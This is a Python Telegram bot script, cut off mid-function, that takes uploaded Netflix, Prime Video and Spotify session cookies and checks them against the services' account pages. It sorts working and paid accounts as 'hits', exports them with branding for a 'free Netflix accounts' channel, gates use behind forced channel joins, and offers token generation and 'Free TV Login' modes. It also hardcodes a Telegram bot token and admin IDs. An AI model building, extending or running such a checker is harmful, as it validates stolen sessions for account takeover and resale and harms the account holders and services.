#!/usr/bin/env python3
"""
FULL MERGED SCRIPT: 
- Netflix Full Script with Prime
- Spotify Cookie Checker
- Force-Join Gate
- Flask Web Server
- All in one complete script
"""

import os
import re
import json
import logging
import requests
import io
import zipfile
import hashlib
import tempfile
import time
import asyncio
import codecs
import html as html_mod
import random
import string
import threading
import shutil
import sys
import copy
from collections import OrderedDict, defaultdict
from datetime import datetime
from functools import lru_cache
from pathlib import Path
from typing import Dict, Any, Callable, Optional, List, Set, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile, Document
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes
)
from telegram.error import BadRequest
from urllib3.exceptions import InsecureRequestWarning
import urllib.parse

from flask import Flask, jsonify
import time as time_module

# ==================== FORCE-JOIN CHANNELS ====================
FORCE_JOIN_CHANNELS = [
    {"id": -1003729057004, "link": "https://t.me/esdiekidrav_gateways"},
    {"id": -1003729789225, "link": "https://t.me/+PQjhAQwyMBBlNDc1"},
    {"id": -1003343836959, "link": "https://t.me/free_netflix_accountsss"},
]

# ==================== FLASK APP ====================
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return jsonify({"status": "Bot Running", "time": time_module.time()})

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port)

# ==================== CONFIGURATION ====================
TOKEN = "8759631989:AAHoomq0pnzdx-1oy5XrJzFWp9i12cNeyEs"
OWNER_ID = 8431995898
ADMIN_IDS = [8431995898, 1851637448]
WATERMARK = "Made By @Chatgpt998 | @free_netflix_accountsss"

MAX_WORKERS = 20
BATCH_SIZE = 10
dot_length = 5
MAX_LIVE_HITS = 20

COOKIES_DIR = "vault"
PROXY_FILE = "proxy.txt"
REQUEST_TIMEOUT = 20
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ==================== LOGGING ====================
logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

# ==================== GLOBALS ====================
user_locks = defaultdict(asyncio.Lock)
user_state = {}
user_executors = {}
user_tasks = {}
cookie_lock = threading.Lock()
tv_stats_lock = threading.Lock()

tv_stats = {
    "total_logins": 0,
    "successful": 0,
    "failed": 0,
    "codes_rejected": 0,
    "started_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
}

# ==================== PRIME VIDEO CONFIG ====================
PRIME_DEFAULT_CONFIG = {
    "txt_fields": {
        "profile": True,
        "region": True,
    },
    "notifications": {
        "webhook": {
            "enabled": False,
            "url": "",
            "mode": "all",
        },
        "telegram": {
            "enabled": False,
            "bot_token": "",
            "chat_id": "",
            "mode": "all",
        },
    },
    "display": {
        "mode": "simple",
    },
    "retries": {
        "error_proxy_attempts": 3,
    },
}

REQUIRED_AUTH_COOKIE_KEYS = ("session-token", "x-main-av", "at-main", "ubid-main")
DUPLICATE_COOKIE_KEYS = (
    "session-token",
    "at-main-av",
    "x-main-av",
    "sess-at-main-av",
    "ubid-main-av",
    "session-id",
)
CONFIG_LOGGED_OUT_STATUS = 412
CONFIG_UNAVAILABLE_STATUS = 520
STOREFRONT_TIMEOUT = (8, 15)
CONFIG_TIMEOUT = (5, 8)

PRIME_REQUEST_HEADERS = {
    "Host": "www.primevideo.com",
    "Connection": "keep-alive",
    "device-memory": "4",
    "sec-ch-device-memory": "4",
    "dpr": "1",
    "sec-ch-dpr": "1",
    "viewport-width": "1366",
    "sec-ch-viewport-width": "1366",
    "rtt": "100",
    "downlink": "2.7",
    "ect": "4g",
    "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-ch-ua-platform-version": '"19.0.0"',
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    ),
    "Accept": (
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,"
        "image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
    ),
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    "Accept-Encoding": "identity",
}

PRIME_BRANDING_LINE = "Made with ❤️ by @chatgpt998"
COOKIE_BRAND_LABEL = "Telegram :- @chatgpt998"
FILENAME_WATERMARK = "@chatgpt998"

# ==================== NETFLIX CONSTANTS ====================
NETFLIX_COOKIE_NAMES = {
    "NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent", 
    "flwssn", "memclid", "profilesNewSession", "clSharedContext"
}

REQUIRED_COOKIES = ("NetflixId",)
OPTIONAL_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_COOKIE_NAMES = set(REQUIRED_COOKIES + OPTIONAL_COOKIES)
CANONICAL_NAMES = {name.lower(): name for name in ALL_COOKIE_NAMES}

NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

# ==================== UI MESSAGES ====================
START_MSG = (
    "<code>\n"
    " █ NETFLIX & PRIME MULTI-TOOL BOT █\n\n"
    "[ Step 1 ] Choose platform below\n"
    "[ Step 2 ] Choose mode or upload file\n"
    "[ Step 3 ] Get results\n"
    "</code>"
    "<a href=\"https://t.me/free_netflix_accountsss\">‎ </a>"
)

PLATFORM_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🎬 Netflix", callback_data="platform_netflix"),
     InlineKeyboardButton("📺 Prime Video", callback_data="platform_prime")],
    [InlineKeyboardButton("🎵 Spotify", callback_data="platform_spotify")],
])

NETFLIX_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔍 Check Account", callback_data="mode_check"),
     InlineKeyboardButton("🔑 Get NF Token", callback_data="mode_nftoken")],
    [InlineKeyboardButton("🧹 Clean Cookies", callback_data="mode_clean"),
     InlineKeyboardButton("📺 Free TV Login", callback_data="mode_tvlogin")],
    [InlineKeyboardButton("🔙 Back", callback_data="back_platform")]
])

PRIME_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔍 Check Cookies", callback_data="prime_check")],
    [InlineKeyboardButton("🔙 Back", callback_data="back_platform")]
])

SPOTIFY_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔍 Check Spotify", callback_data="spotify_check")],
    [InlineKeyboardButton("🔙 Back", callback_data="back_platform")]
])

CHECK_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("▶️ Start Checking", callback_data="start_check")]
])

STOP_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("🛑 Stop", callback_data="stop_check"),
     InlineKeyboardButton("📋 Get Hits", callback_data="get_hits")]
])

RESULT_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("📄 Get as .txt", callback_data="result_txt"),
     InlineKeyboardButton("📦 Get as .zip", callback_data="result_zip")]
])

# ==================== FORCE-JOIN HELPERS ====================
async def check_join(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> List[Dict]:
    """Check membership in all force-join channels."""
    not_joined = []
    for ch in FORCE_JOIN_CHANNELS:
        try:
            member = await context.bot.get_chat_member(chat_id=ch["id"], user_id=user_id)
            if member.status not in ("member", "administrator", "creator"):
                not_joined.append(ch)
        except Exception:
            not_joined.append(ch)
    return not_joined

def join_buttons(channels: List[Dict]) -> InlineKeyboardMarkup:
    """Build inline keyboard with channel links and a verify button."""
    buttons = [
        [InlineKeyboardButton("📢 Join Channel", url=ch["link"])]
        for ch in channels
    ]
    buttons.append([InlineKeyboardButton("✅ I've Joined", callback_data="verify_join")])
    return InlineKeyboardMarkup(buttons)

async def force_join_gate(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """
    Check if user has joined all required channels.
    Returns True if allowed, False if not.
    """
    user = update.effective_user
    if not user:
        return True
    
    not_joined = await check_join(user.id, context)
    if not_joined:
        await update.message.reply_text(
            "🌟 Welcome! 🌟\n\n"
            "To use this bot, you must join our channels first:",
            reply_markup=join_buttons(not_joined)
        )
        return False
    return True

async def verify_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the 'I've Joined' button callback."""
    query = update.callback_query
    user = query.from_user
    await query.answer()

    not_joined = await check_join(user.id, context)
    if not_joined:
        await query.edit_message_text(
            "❌ Not Joined!\n\nPlease join all channels first:",
            reply_markup=join_buttons(not_joined)
        )
    else:
        await query.edit_message_text(
            f"✅ Verified!\n\nWelcome {user.first_name}! You can now use the bot."
        )
        # Show main menu after verification
        await query.message.reply_html(START_MSG, reply_markup=PLATFORM_MARKUP)

# ==================== PRIME VIDEO HELPER FUNCTIONS ====================
def prime_merge_config(default_cfg, user_cfg):
    merged = copy.deepcopy(default_cfg)
    if not isinstance(user_cfg, dict):
        return merged
    for key, value in user_cfg.items():
        if key in merged and isinstance(merged[key], dict) and isinstance(value, dict):
            merged[key] = prime_merge_config(merged[key], value)
        else:
            merged[key] = value
    return merged

def prime_random_number_string(length=8):
    return "".join(random.choices(string.digits, k=length))

def prime_sanitize_for_filename(value, fallback="unknown"):
    cleaned = re.sub(r"[^A-Za-z0-9._-]+", "-", str(value or "").strip()).strip("-._")
    return cleaned[:80] if cleaned else fallback

def prime_format_paid_label(is_paid):
    if is_paid is True:
        return "YES✅"
    if is_paid is False:
        return "NO❌"
    return "UNKNOWN⚠️"

def prime_plan_label_from_paid_state(is_paid):
    if is_paid is True:
        return "Paid"
    if is_paid is False:
        return "Free"
    return "Unknown"

def prime_result_type_from_paid_state(is_paid):
    if is_paid is True:
        return "success"
    return "free"

def prime_has_known_value(value):
    normalized = str(value or "").strip()
    return bool(normalized) and normalized.lower() not in {
        "unknown",
        "unknown⚠️",
        "none",
        "null",
        "n/a",
        "unrecognised",
        "unrecognized",
    }

def prime_normalize_identity_value(value):
    return str(value or "").strip().lower()

def prime_build_cookie_signature(cookies):
    signature_parts = []
    for key in DUPLICATE_COOKIE_KEYS:
        value = str(cookies.get(key, "")).strip()
        if value:
            signature_parts.append(f"{key}={value}")
    if not signature_parts:
        return ""
    digest = hashlib.sha256("\n".join(signature_parts).encode("utf-8")).hexdigest()
    return f"cookie:{digest}"

def prime_build_duplicate_key(data, cookies):
    customer_id = prime_normalize_identity_value(data.get("customer_id"))
    if prime_has_known_value(customer_id):
        return f"customer:{customer_id}"
    cookie_signature = prime_build_cookie_signature(cookies)
    if cookie_signature:
        return cookie_signature
    profile = prime_normalize_identity_value(data.get("profile"))
    region = prime_normalize_identity_value(data.get("region"))
    metadata_parts = tuple(part for part in (profile, region) if prime_has_known_value(part))
    if metadata_parts:
        return ("meta",) + metadata_parts
    return ""

def prime_find_first_value(obj, target_keys):
    if isinstance(target_keys, str):
        target_keys = {target_keys}
    else:
        target_keys = set(target_keys)

    if isinstance(obj, dict):
        for key, value in obj.items():
            if key in target_keys and value not in (None, ""):
                return value
            nested = prime_find_first_value(value, target_keys)
            if nested not in (None, ""):
                return nested
    elif isinstance(obj, list):
        for item in obj:
            nested = prime_find_first_value(item, target_keys)
            if nested not in (None, ""):
                return nested
    return None

def prime_has_required_auth_cookies(cookies):
    return any(key in cookies for key in REQUIRED_AUTH_COOKIE_KEYS)

def prime_cookies_dict_from_netscape(netscape_text):
    cookies = {}
    for line in netscape_text.splitlines():
        parts = line.split("\t")
        if len(parts) >= 7:
            cookies[parts[5]] = parts[6]
    return cookies

def prime_normalize_netscape_cookie_text(raw_text):
    clean_lines = []
    for line in raw_text.splitlines():
        parts = line.strip().split("\t")
        if len(parts) >= 7:
            clean_lines.append(line.strip())
    return "\n".join(clean_lines)

def prime_convert_json_to_netscape(json_data):
    if isinstance(json_data, dict) and isinstance(json_data.get("cookies"), list):
        json_data = json_data["cookies"]
    if not isinstance(json_data, list):
        raise ValueError("JSON cookie format is invalid")
    lines = []
    for cookie in json_data:
        domain = str(cookie.get("domain", ""))
        tail_match = "TRUE" if domain.startswith(".") else "FALSE"
        path = str(cookie.get("path", "/"))
        secure = "TRUE" if cookie.get("secure", False) else "FALSE"
        expires = cookie.get("expirationDate") or cookie.get("expires") or cookie.get("expiry") or 0
        name = str(cookie.get("name", ""))
        value = str(cookie.get("value", ""))
        lines.append(f"{domain}\t{tail_match}\t{path}\t{secure}\t{int(float(expires))}\t{name}\t{value}")
    return "\n".join(lines)

def prime_parse_cookie_file(cookie_path):
    with open(cookie_path, "r", encoding="utf-8", errors="ignore") as handle:
        content = handle.read()
    try:
        netscape_text = prime_normalize_netscape_cookie_text(prime_convert_json_to_netscape(json.loads(content)))
    except Exception:
        netscape_text = prime_normalize_netscape_cookie_text(content)
    cookies = prime_cookies_dict_from_netscape(netscape_text)
    return netscape_text, cookies

def prime_extract_with_patterns(text, patterns, default="Unknown"):
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
        if match:
            value = match.group(1).strip()
            if value:
                return value
    return default

def prime_extract_prime_region(source_text, config_data=None):
    region = ""
    if isinstance(config_data, dict):
        region = str(prime_find_first_value(config_data, "recordTerritory") or "").strip()
    if prime_has_known_value(region):
        return region
    return prime_extract_with_patterns(
        source_text,
        [
            r'"recordTerritory"\s*:\s*"([^"]+)"',
            r'&#34;recordTerritory&#34;\s*:\s*&#34;([^&]+)&#34;',
        ],
        default="",
    )

def prime_extract_prime_customer_id(source_text, config_data=None):
    customer_id = ""
    if isinstance(config_data, dict):
        customer_id = str(prime_find_first_value(config_data, {"customerID", "customerId"}) or "").strip()
    if prime_has_known_value(customer_id):
        return customer_id
    customer_id = prime_extract_with_patterns(
        source_text,
        [
            r'"customerID"\s*:\s*"([^"]+)"',
            r'&#34;customerID&#34;\s*:\s*&#34;([^&]+)&#34;',
        ],
        default="",
    )
    return customer_id if prime_has_known_value(customer_id) else ""

def prime_infer_signin_state(source_text, config_data=None, customer_id=""):
    if prime_has_known_value(customer_id):
        return "signed_in"
    if re.search(r'"watchlistAction"\s*:\s*\{\s*"ajaxEnabled"\s*:\s*(true|false|null)', source_text, re.IGNORECASE):
        return "signed_in"
    if 'data-testid="pv-nav-sign-out"' in source_text:
        return "signed_in"
    if 'data-testid="active-profile-' in source_text:
        return "signed_in"
    has_signin_link = 'data-testid="pv-nav-sign-in"' in source_text
    has_inactive_profile = 'data-testid="inactive-profile-placeholder"' in source_text
    has_signin_redirect = bool(re.search(r'/auth-redirect/[^"\']*signin=1', source_text, re.IGNORECASE))
    has_signin_form = bool(re.search(r'/(?:ap|gp)/signin|name=["\'](?:email|password)["\']', source_text, re.IGNORECASE))
    if has_signin_form or (has_signin_link and has_signin_redirect):
        return "sign_in_page"
    if has_inactive_profile and (has_signin_link or has_signin_redirect):
        return "sign_in_page"
    if isinstance(config_data, dict):
        config_customer_id = str(prime_find_first_value(config_data, {"customerID", "customerId"}) or "").strip()
        if prime_has_known_value(config_customer_id):
            return "signed_in"
    return "unknown"

def prime_infer_prime_video_data(source_text, cookie_file, config_data=None):
    watchlist_match = re.search(
        r'"watchlistAction"\s*:\s*\{\s*"ajaxEnabled"\s*:\s*(true|false|null)',
        source_text,
        re.IGNORECASE,
    )
    watchlist_value = watchlist_match.group(1).lower() if watchlist_match else ""
    if watchlist_value == "true":
        is_paid = True
    elif watchlist_value == "false":
        is_paid = False
    elif re.search(r"subscribe now", source_text, re.IGNORECASE):
        is_paid = False
    else:
        is_paid = None

    profile = prime_extract_with_patterns(
        source_text,
        [
            r'data-testid="active-profile-([^"]+)"',
            r'"profiles"\s*:\s*\[\{"name":"([^"]+)"',
            r'"displayName":"([^"]+)"',
        ],
        default="",
    )
    region = prime_extract_prime_region(source_text, config_data)
    customer_id = prime_extract_prime_customer_id(source_text, config_data)
    signin_state = prime_infer_signin_state(source_text, config_data, customer_id)
    return {
        "profile": profile,
        "region": region,
        "watchlist_enabled": watchlist_value if watchlist_value else "unknown",
        "is_paid": is_paid,
        "paid_status": prime_format_paid_label(is_paid),
        "plan": prime_plan_label_from_paid_state(is_paid),
        "signin_state": signin_state,
        "source_file": cookie_file,
        "customer_id": customer_id,
    }

def prime_classify_non_success_result(status_code=None, signin_state="unknown", last_exception=None):
    if signin_state == "sign_in_page" or status_code in {401, 403, CONFIG_LOGGED_OUT_STATUS}:
        return "failed"
    return "error"

def prime_should_storefront_fallback_to_unknown(status_code, data):
    if status_code in (None, 200, 401, 403, CONFIG_LOGGED_OUT_STATUS):
        return False
    if not isinstance(data, dict):
        return False
    if data.get("signin_state") != "signed_in":
        return False
    return data.get("watchlist_enabled") != "unknown"

def prime_set_unknown_plan_data(data):
    data["is_paid"] = None
    data["paid_status"] = prime_format_paid_label(None)
    data["plan"] = prime_plan_label_from_paid_state(None)
    return data

def prime_get_video_configuration(session, proxy=None):
    headers = dict(PRIME_REQUEST_HEADERS)
    headers.update(
        {
            "Host": "atv-ps.primevideo.com",
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://www.primevideo.com/region/eu/storefront",
        }
    )
    response = session.get(
        "https://atv-ps.primevideo.com/acm/GetConfiguration/WebClient?deviceTypeID=AOAGZA014O5RE&deviceID=Web",
        headers=headers,
        timeout=CONFIG_TIMEOUT,
        proxies=proxy,
        allow_redirects=True,
    )
    status_code = response.status_code
    final_url = response.url or ""
    source_text = response.text or ""
    if "signin" in final_url.lower() or "ap/signin" in final_url.lower():
        return {}, 401, source_text
    if status_code != 200:
        return {}, status_code, source_text
    try:
        return response.json() or {}, status_code, source_text
    except Exception:
        match = re.search(r'"recordTerritory"\s*:\s*"([^"]+)"', source_text, re.IGNORECASE)
        customer_match = re.search(r'"customerID"\s*:\s*"([^"]+)"', source_text, re.IGNORECASE)
        fallback = {}
        if match:
            fallback["recordTerritory"] = match.group(1).strip()
        if customer_match:
            fallback["customerID"] = customer_match.group(1).strip()
        return fallback, status_code, source_text

def prime_get_video_data(session, proxy=None):
    response = session.get(
        "https://www.primevideo.com/region/eu/storefront",
        headers=PRIME_REQUEST_HEADERS,
        timeout=STOREFRONT_TIMEOUT,
        proxies=proxy,
        allow_redirects=True,
    )
    status_code = response.status_code
    final_url = response.url or ""
    source_text = response.text or ""

    if status_code != 200:
        return None, status_code, {}

    if "signin" in final_url.lower() or "ap/signin" in final_url.lower():
        return source_text, 401, {}

    config_data, config_status_code, _ = prime_get_video_configuration(session, proxy)
    if config_status_code != 200:
        return source_text, config_status_code, config_data
    return source_text, status_code, config_data

def prime_format_cookie_file(data, cookie_content, config):
    txt_fields = config.get("txt_fields", {})
    lines = []
    region = data.get("region") if prime_has_known_value(data.get("region")) else "Unknown"

    if txt_fields.get("profile", True) and prime_has_known_value(data.get("profile")):
        lines.append(f"Profile: {data.get('profile')}")
    if txt_fields.get("region", True):
        lines.append(f"Region: {region}")
    lines.append(f"Plan: {data.get('plan', 'Unknown')}")
    lines.append("")
    lines.append(PRIME_BRANDING_LINE)
    lines.append(COOKIE_BRAND_LABEL)
    lines.append("")
    lines.append(cookie_content.strip())
    lines.append("")
    return "\n".join(lines)

def prime_generate_filename(data):
    region = prime_sanitize_for_filename(data.get("region", "unknown"))
    status = "Paid" if data.get("is_paid") is True else "Free" if data.get("is_paid") is False else "Unknown"
    parts = [region, FILENAME_WATERMARK]
    if prime_has_known_value(data.get("profile")):
        parts.append(prime_sanitize_for_filename(data.get("profile", "")))
    parts.extend([status, prime_random_number_string()])
    return f"{'_'.join(parts)}.txt"

def prime_load_proxies():
    return []

def prime_get_run_folder():
    return f"run_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}"

def prime_create_output_folder_when_needed(is_paid, run_folder, base_path):
    folder_name = "Paid" if is_paid is True else "Free" if is_paid is False else "Unknown"
    output_path = os.path.join(base_path, "hits", run_folder, folder_name)
    os.makedirs(output_path, exist_ok=True)
    return output_path

def prime_create_duplicate_output_folder(run_folder, base_path):
    output_path = os.path.join(base_path, "hits", run_folder, "Duplicate")
    os.makedirs(output_path, exist_ok=True)
    return output_path

# ==================== NETFLIX HELPER FUNCTIONS ====================
def safe_filename(name):
    return re.sub(r'[^a-zA-Z0-9_\-\.]', '_', name)

def clean_unicode(val):
    if not isinstance(val, str):
        return val
    try:
        val = codecs.decode(val, 'unicode_escape')
    except:
        pass
    try:
        val = html_mod.unescape(val)
    except:
        pass
    val = val.encode('utf-8', errors='replace').decode('utf-8', errors='replace')
    val = ''.join(c for c in val if ord(c) >= 32 or c in '\n\r\t')
    return val

def safe_html(text):
    if not text:
        return "Unknown"
    text = clean_unicode(str(text))
    text = text.encode('ascii', errors='replace').decode('ascii', errors='replace')
    return text

def dict_to_netscape(cookie_dict, domain=".netflix.com"):
    expiry = int(time.time()) + 180 * 24 * 3600
    lines = ["# Netscape HTTP Cookie File"]
    for k, v in cookie_dict.items():
        lines.append(f"{domain}\tTRUE\t/\tFALSE\t{expiry}\t{k}\t{v}")
    return "\n".join(lines)

EMAIL_RE = re.compile(r'([A-Za-z0-9._%+-]{2})[A-Za-z0-9._%+-]*(@[A-Za-z0-9.-]+\.[A-Za-z]{2,})')
PHONE_RE = re.compile(r'(\+?\d{2})\d{2,}(\d{2})')

def scrub_email(m):
    return f"{m.group(1)}***{m.group(2)}"

def scrub_phone(m):
    return f"{m.group(1)}******{m.group(2)}"

def scrub_text(text: str) -> str:
    if not text:
        return "Unknown"
    text = safe_html(text)
    text = EMAIL_RE.sub(scrub_email, text)
    text = PHONE_RE.sub(scrub_phone, text)
    return text

def parse_cookie_file(text):
    text = text.strip()
    results = []
    
    try:
        if text.startswith("{") or text.startswith("["):
            obj = json.loads(text)
            if isinstance(obj, dict):
                cookie_dict = {k: str(v) for k, v in obj.items() if k in NETFLIX_COOKIE_NAMES}
                if cookie_dict.get('NetflixId'):
                    results.append(("json_block", cookie_dict))
                if "cookies" in obj and isinstance(obj["cookies"], list):
                    merged = {}
                    for cookie in obj["cookies"]:
                        if isinstance(cookie, dict) and "name" in cookie and "value" in cookie:
                            if cookie["name"] in NETFLIX_COOKIE_NAMES:
                                merged[cookie["name"]] = cookie["value"]
                    if merged.get('NetflixId'):
                        results.append(("json_cookies", merged))
            elif isinstance(obj, list):
                merged = {}
                for cookie in obj:
                    if isinstance(cookie, dict):
                        name = cookie.get("name") or cookie.get("key")
                        value = cookie.get("value")
                        if name and value and name in NETFLIX_COOKIE_NAMES:
                            merged[name] = value
                if merged.get('NetflixId'):
                    results.append(("json_list", merged))
    except:
        pass

    netscape_entries = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith("#") and not line.startswith("#HttpOnly_"):
            continue
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) >= 7:
            name = parts[5]
            value = parts[6]
            if name in NETFLIX_COOKIE_NAMES:
                domain = parts[0].replace("#HttpOnly_", "")
                netscape_entries.append({
                    "name": name, "value": value,
                    "domain": domain, "path": parts[2],
                    "secure": parts[3], "expires": parts[4]
                })
    
    if netscape_entries:
        netflix_ids = [(i, e) for i, e in enumerate(netscape_entries) if e["name"] == "NetflixId"]
        
        for nf_idx, nf_entry in netflix_ids:
            cookie_set = {"NetflixId": nf_entry["value"]}
            for entry in netscape_entries:
                if entry["name"] != "NetflixId":
                    cookie_set[entry["name"]] = entry["value"]
            results.append((f"netscape_{nf_idx}", cookie_set))
        
        if not netflix_ids:
            merged = {}
            for e in netscape_entries:
                merged[e["name"]] = e["value"]
            if merged:
                results.append(("netscape_all", merged))
    
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        sc = {}
        for part in line.split(";"):
            part = part.strip()
            if "=" in part:
                k, v = part.split("=", 1)
                k, v = k.strip(), v.strip()
                if k in NETFLIX_COOKIE_NAMES:
                    sc[k] = v
        if sc.get('NetflixId'):
            results.append((f"semicolon_{len(results)}", sc))

    kv = {}
    for line in text.splitlines():
        line = line.strip()
        if "=" in line and not line.startswith("#"):
            k, v = line.split("=", 1)
            k, v = k.strip(), v.strip()
            if k in NETFLIX_COOKIE_NAMES:
                kv[k] = v
    if kv.get('NetflixId'):
        results.append(("keyvalue", kv))

    nf_pattern = r'NetflixId\s*[:=]\s*([^\s;,\n"\']{20,})'
    nf_matches = re.findall(nf_pattern, text, re.IGNORECASE)
    
    for nf_val in nf_matches:
        nf_val = nf_val.strip('"\'')
        cs = {"NetflixId": nf_val}
        for cn in NETFLIX_COOKIE_NAMES - {"NetflixId"}:
            m = re.search(rf'{cn}\s*[:=]\s*([^\s;,\n"\']+)', text, re.IGNORECASE)
            if m:
                cs[cn] = m.group(1).strip('"\'')
        results.append((f"regex_{len(results)}", cs))
    
    return results

async def extract_cookies_from_zip(zip_path):
    cookies = []
    with zipfile.ZipFile(zip_path, 'r') as z:
        for info in z.infolist():
            if info.is_dir():
                continue
            if info.filename.startswith('__MACOSX') or info.filename.startswith('.'):
                continue
            if info.filename.lower().endswith(('.txt', '.json')):
                with z.open(info) as f:
                    try:
                        content = f.read().decode('utf-8', errors='ignore')
                        c = parse_cookie_file(content)
                        for idx, (blockname, cc) in enumerate(c):
                            cookies.append((f"{safe_filename(info.filename)}_{idx}", cc))
                    except:
                        continue
    return cookies

def check_netflix_cookie(cookie_dict):
    if not cookie_dict.get('NetflixId'):
        return {'ok': False, 'reason': 'No NetflixId', 'cookie': cookie_dict}
    
    session = requests.Session()
    session.cookies.update(cookie_dict)
    headers = {
        'User-Agent': USER_AGENT,
        'Accept': 'text/html,application/xhtml+xml',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
    }
    
    try:
        urls = [
            'https://www.netflix.com/YourAccount',
            'https://www.netflix.com/account',
            'https://www.netflix.com/account/membership',
        ]
        
        resp = None
        txt = ""
        for url in urls:
            try:
                r = session.get(url, headers=headers, timeout=25, allow_redirects=True)
                if r.status_code == 200 and 'Account' in r.text:
                    resp = r
                    txt = r.text
                    break
            except:
                continue
        
        if not resp or resp.status_code != 200:
            return {'ok': False, 'reason': f'HTTP {resp.status_code if resp else "error"}', 'cookie': cookie_dict}

        if 'login' in resp.url.lower() or 'signin' in resp.url.lower():
